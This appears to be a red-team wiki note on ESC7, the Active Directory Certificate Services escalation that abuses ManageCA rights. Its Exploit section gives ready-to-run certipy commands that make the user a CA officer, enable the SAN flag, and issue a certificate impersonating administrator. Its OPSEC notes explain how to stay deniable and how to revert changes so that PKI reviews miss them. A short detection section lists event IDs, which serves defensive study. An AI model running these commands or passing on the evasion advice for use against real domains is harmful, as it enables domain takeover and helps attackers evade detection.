---
title: "ESC7 — ManageCA / ManageCertificates (CA management rights)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, privilege-escalation]
---

# ESC7

**CA management rights.** When an attacker (or a group they're in) holds
**`ManageCA`** or **`ManageCertificates`** on the CA object — an
[[acl-abuse]] condition — they control the CA itself: grant themselves
Officer rights, flip CA-wide flags (making [[esc6]] live), and approve or
issue pending requests. It's the CA-side equivalent of "own the object, own
the trust": with ManageCA you can mint certs for anyone the CA can mint for.

Usually reached via [[esc5]] (WriteDacl/WriteOwner on the CA object or the
`Public Key Services` container → grant yourself ManageCA).

## Exploit

```bash
# 1. promote yourself to Officer if you only hold ManageCA
certipy ca -u user@corp.local -p 'Pass' -ca CORP-CA -add-officer user

# 2. enable the CA-wide SAN flag (ManageCA) -> ESC6 against every template
certipy ca -u user@corp.local -p 'Pass' -ca CORP-CA -edit-config-security EDITF_ATTRIBUTESUBJECTALTNAME2
# (CertSvc restart on the CA may be needed for it to take effect)

# 3. now ESC1/ESC6 — or approve/issue a previously denied request
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template User -upn administrator@corp.local
certipy ca -u user@corp.local -p 'Pass' -ca CORP-CA -issue-request <REQUEST_ID>
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -retrieve <REQUEST_ID>
```

## Red-team notes (OPSEC)

- **ManageCA is quieter than it looks** — CA config changes land in the CA's
  own event log, not the DC; a flag flip + one issuance is a short,
  deniable footprint compared to an ESC4 template rewrite.
- **Restore what you changed** — `EDITF_ATTRIBUTESUBJECTALTNAME2` and Officer
  lists are exactly what PKI teams diff in reviews; revert after the cert is
  in hand.
- Pair with [[certificate-mapping]] checks: if enforcement is Full, your
  issued cert still needs the SID binding to map cleanly.

## Detection

- **CA event log**: Officer/role changes, CA config edits (the
  `EDITF_ATTRIBUTESUBJECTALTNAME2` flip), and **4886/4887** for certs issued
  by an Officer from a non-enrollee account.
- **5136** on the CA object DACL if the right was gained via WriteDacl
  ([[esc5]] path).

## Links

- [[ad-cs-esc-attacks]], [[esc5]] (reached via), [[esc6]] (the flag you enable)
- [[certificate-templates]] — what the CA right finally controls
- [[certipy]], [[certified-pre-owned]]
